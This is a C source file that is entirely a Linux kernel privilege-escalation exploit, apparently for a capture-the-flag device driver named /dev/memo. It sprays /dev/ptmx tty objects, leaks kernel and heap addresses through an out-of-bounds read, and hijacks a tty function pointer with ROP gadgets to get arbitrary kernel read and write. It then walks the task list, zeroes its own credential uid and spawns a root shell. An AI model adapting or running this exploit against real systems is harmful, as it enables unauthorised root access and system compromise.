#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include<poll.h>
#include<signal.h>
#include<sys/ipc.h>
#include<sys/msg.h>
#include<sys/socket.h>
#include<sys/xattr.h>
#include<sys/prctl.h>

#define DEVICE_FILE "/dev/memo"
#define SPRAY 0x15ul

int fd;
int spray_fd[SPRAY];
int target_fd;

#define LEAK_OFFSET 0xe65900ul

#define CRED_OFFSET 0x620ul
#define TASKS_OFFSET 0x388ul
#define PID_OFFSET 0x488ul

unsigned long aw=0xa0333;// mov dword ptr [rdx], esi; ret;
unsigned long ar=0x56cdef;// mov rax, qword ptr [rdx]; ret; 
unsigned long init_task=0x1211740;

unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long heap_leak;
unsigned long heap_base;
unsigned long memo;
unsigned long device;

void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}
void read_setup(){
	unsigned int leak;
	lseek(fd,0x360,SEEK_SET);
	unsigned long rip[1]={ar};
	write(fd,(char *)rip,0x8);
}
void write_setup(){
	lseek(fd,0x360,SEEK_SET);
	unsigned long rip[1]={aw};
	write(fd,(char *)rip,0x8);
}
unsigned long read8(unsigned long addr){
	return ioctl(target_fd,0,addr);
}
unsigned long write4(unsigned long addr,unsigned long value){
	ioctl(target_fd,value,addr);
}

void exploit(){
	for(int i=0;i<SPRAY;i++){
		spray_fd[i]=open("/dev/ptmx",O_RDONLY);
	}
	fd=open(DEVICE_FILE,O_RDWR);
	target_fd=open("/dev/ptmx",O_RDONLY);
	lseek(fd,0x3f8,SEEK_SET);
	unsigned long leaks[93];
	read(fd,(char *)leaks,0x2e8);
	device=leaks[3];
	kernel_leak=leaks[4];
	kernel_base=kernel_leak-LEAK_OFFSET;
	init_task+=kernel_base;
	aw+=kernel_base;
	ar+=kernel_base;
	printf("[+] Device=%p\n",(void *)device);
	printf("[+] aw=%p\n",(void *)aw);
	printf("[+] ar=%p\n",(void *)ar);
	printf("[+] Kernel_leak=%p\n",(void *)kernel_leak);
	printf("[+] Kernel_base=%p\n",(void *)kernel_base);
	printf("[+] Kernel_init_task=%p\n",(void *)init_task);
	heap_leak=leaks[8];
	memo=heap_leak-0x438;
	heap_base=heap_leak&0xffffffff00000000;
	printf("[+] Heap_leak=%p\n",(void *)heap_leak);
	printf("[+] memo=%p\n",(void *)memo);
	unsigned long payload[5]={0,0x0000000100005401,0,device,memo+0x300};
	lseek(fd,0x3f8,SEEK_SET);
	write(fd,(char *)payload,0x28);

	unsigned long cur=init_task,cred;
	unsigned int pid;
	unsigned int this_pid=getpid();
	printf("[+] Current_pid=%u\n",this_pid);
	read_setup();
	while(1){
		pid=read8(cur+PID_OFFSET)&0xffffffff;
		if(pid==this_pid){
			printf("[+] Current_task_struct=%p\n",(void *)cur);
			cred=read8(cur+CRED_OFFSET)+heap_base;
			printf("[+] Current_cred_struct=%p\n",(void *)cred);
			write_setup();
			//for(unsigned long i=1;i<9;i++){
			write4(cred+4,0);
			break;
			//}
		}
		cur=read8(cur+TASKS_OFFSET)-TASKS_OFFSET+heap_base;
	}
	getshell();
}

int main(){
	exploit();
	return 0;
}
